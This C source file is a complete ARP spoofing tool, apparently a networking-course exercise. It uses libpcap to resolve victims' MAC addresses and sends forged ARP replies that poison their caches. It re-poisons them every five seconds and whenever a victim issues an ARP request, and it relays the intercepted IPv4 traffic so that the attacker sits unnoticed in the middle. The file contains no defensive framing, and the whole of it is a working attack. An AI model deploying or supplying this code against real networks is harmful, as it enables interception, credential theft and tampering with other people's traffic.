#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>

#include "ansheader.h" 

typedef struct SessionNode {
    Session session;           
    struct SessionNode* next;  
} SessionNode;

pcap_t* handle;
Mac my_mac;
Ip my_ip;
SessionNode* session_list_head = NULL; 

pthread_mutex_t pcap_mutex = PTHREAD_MUTEX_INITIALIZER;

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Ip str_to_ip(const char* str) {
    Ip res;
    res.ip = inet_addr(str);
    return res;
}

int get_my_info(const char* dev, Mac* mac, Ip* ip) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) { close(sock); return -1; }
    memcpy(mac->m, ifr.ifr_addr.sa_data, MAC_ALEN);
    
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) { close(sock); return -1; }
    ip->ip = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
    
    close(sock);
    return 0;
}

int resolve_mac(pcap_t* pcap, Ip target_ip, Mac* target_mac) {
    EthArpPacket req_pkt;
    Mac broadcast = {{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}};
    Mac zero_mac = {{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}};

    req_pkt.eth.dst_mac = broadcast;
    req_pkt.eth.src_mac = my_mac;
    req_pkt.eth.eth_type = htons(ETH_P_ARP);
    
    req_pkt.arp.hw_type = htons(1);
    req_pkt.arp.proto_type = htons(ETH_P_IPV4);
    req_pkt.arp.hw_size = MAC_ALEN;
    req_pkt.arp.proto_size = 4;
    req_pkt.arp.op_code = htons(ARP_OP_REQUEST);
    req_pkt.arp.sender_mac = my_mac;
    req_pkt.arp.sender_ip = my_ip;
    req_pkt.arp.target_mac = zero_mac;
    req_pkt.arp.target_ip = target_ip;

    for (int retry = 0; retry < 5; retry++) {
        pthread_mutex_lock(&pcap_mutex);
        pcap_sendpacket(pcap, (const u_char*)&req_pkt, sizeof(req_pkt));
        pthread_mutex_unlock(&pcap_mutex);
        
        struct pcap_pkthdr* header;
        const u_char* packet;
        int loop = 0;
        
        while (loop++ < 50) {
            int res = pcap_next_ex(pcap, &header, &packet);
            if (res > 0 && header->caplen >= sizeof(EthArpPacket)) { 
                EthArpPacket* recv = (EthArpPacket*)packet;
                if (ntohs(recv->eth.eth_type) == ETH_P_ARP &&
                    ntohs(recv->arp.op_code) == ARP_OP_REPLY &&
                    recv->arp.sender_ip.ip == target_ip.ip &&
                    memcmp(recv->eth.dst_mac.m, my_mac.m, MAC_ALEN) == 0) {
                    
                    *target_mac = recv->arp.sender_mac;
                    return 0;
                }
            }
        }
    }
    return -1;
}

void send_arp_spoof(Session* s) {
    EthArpPacket inf_pkt;
    inf_pkt.eth.dst_mac = s->sender_mac;
    inf_pkt.eth.src_mac = my_mac;
    inf_pkt.eth.eth_type = htons(ETH_P_ARP);

    inf_pkt.arp.hw_type = htons(1);
    inf_pkt.arp.proto_type = htons(ETH_P_IPV4);
    inf_pkt.arp.hw_size = MAC_ALEN;
    inf_pkt.arp.proto_size = 4;
    inf_pkt.arp.op_code = htons(ARP_OP_REPLY);

    inf_pkt.arp.sender_mac = my_mac;
    inf_pkt.arp.sender_ip = s->target_ip;
    inf_pkt.arp.target_mac = s->sender_mac;
    inf_pkt.arp.target_ip = s->sender_ip;

    pthread_mutex_lock(&pcap_mutex);
    pcap_sendpacket(handle, (const u_char*)&inf_pkt, sizeof(inf_pkt));
    pthread_mutex_unlock(&pcap_mutex);
}

void* periodic_infection_thread(void* arg) {
    (void)arg;
    while (1) {
        sleep(5);
        SessionNode* curr = session_list_head;
        while (curr != NULL) {
            send_arp_spoof(&curr->session);
            curr = curr->next;
        }
    }
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    
    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
    if (!handle) {
        return -1;
    }

    if (get_my_info(dev, &my_mac, &my_ip) < 0) {
        return -1;
    }

    int num_flows = (argc - 2) / 2;
    SessionNode* tail = NULL; 

    for (int i = 0; i < num_flows; i++) {
        SessionNode* new_node = (SessionNode*)malloc(sizeof(SessionNode));
        new_node->session.sender_ip = str_to_ip(argv[2 + i * 2]);
        new_node->session.target_ip = str_to_ip(argv[3 + i * 2]);
        new_node->next = NULL;
        
        printf("Flow %d Resolving Sender MAC\n", i+1);
        if (resolve_mac(handle, new_node->session.sender_ip, &new_node->session.sender_mac) < 0) return -1;

        printf("Flow %d Resolving Target MAC\n", i+1);
        if (resolve_mac(handle, new_node->session.target_ip, &new_node->session.target_mac) < 0) return -1;

        printf("Flow %d Initial Infection\n", i+1);
        send_arp_spoof(&new_node->session);
        printf("arp %d\n", i+1);
        if (session_list_head == NULL) {
            session_list_head = new_node;
        } else {
            tail->next = new_node;
        }
        tail = new_node;
    }

    pthread_t thread_id;
    pthread_create(&thread_id, NULL, periodic_infection_thread, NULL);
    pthread_detach(thread_id);

    struct pcap_pkthdr* header;
    const u_char* packet;
    
    printf("\nARP Spoofing started\n");

    while (1) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res <= 0) continue; 

        if (header->caplen < sizeof(EthHdr)) continue;

        EthHdr* eth = (EthHdr*)packet;
        uint16_t eth_type = ntohs(eth->eth_type);

        SessionNode* curr = session_list_head;
        while (curr != NULL) {
            
            if (eth_type == ETH_P_IPV4) {
                if (header->caplen < sizeof(EthHdr) + sizeof(Ipv4Hdr)) {
                    curr = curr->next;
                    continue;
                }
                Ipv4Hdr* ip = (Ipv4Hdr*)(packet + sizeof(EthHdr));

                if (memcmp(eth->src_mac.m, curr->session.sender_mac.m, MAC_ALEN) == 0 &&
                    memcmp(eth->dst_mac.m, my_mac.m, MAC_ALEN) == 0 &&
                    ip->ip_dst.ip != my_ip.ip) {
                    
                    uint8_t* relay_buf = (uint8_t*)malloc(header->caplen);
                    if (relay_buf) {
                        memcpy(relay_buf, packet, header->caplen);
                        EthHdr* relay_eth = (EthHdr*)relay_buf;
                        
                        relay_eth->src_mac = my_mac;
                        relay_eth->dst_mac = curr->session.target_mac;

                        pthread_mutex_lock(&pcap_mutex);
                        pcap_sendpacket(handle, relay_buf, header->caplen);
                        pthread_mutex_unlock(&pcap_mutex);
                        
                        free(relay_buf);
                    }
                    break; 
                }
            }
            else if (eth_type == ETH_P_ARP) {
                if (header->caplen < sizeof(EthArpPacket)) {
                    curr = curr->next;
                    continue;
                }
                ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
                
                if (arp->sender_ip.ip == curr->session.sender_ip.ip &&
                    arp->target_ip.ip == curr->session.target_ip.ip &&
                    ntohs(arp->op_code) == ARP_OP_REQUEST) {
                    printf("Re-infect\n");
                    send_arp_spoof(&curr->session);
                }
                else if (arp->sender_ip.ip == curr->session.target_ip.ip &&
                         arp->target_ip.ip == curr->session.sender_ip.ip &&
                         ntohs(arp->op_code) == ARP_OP_REQUEST) {
                    printf("Re-infect\n");
                    send_arp_spoof(&curr->session);
                }
            }
            
            curr = curr->next;
        }
    }
}
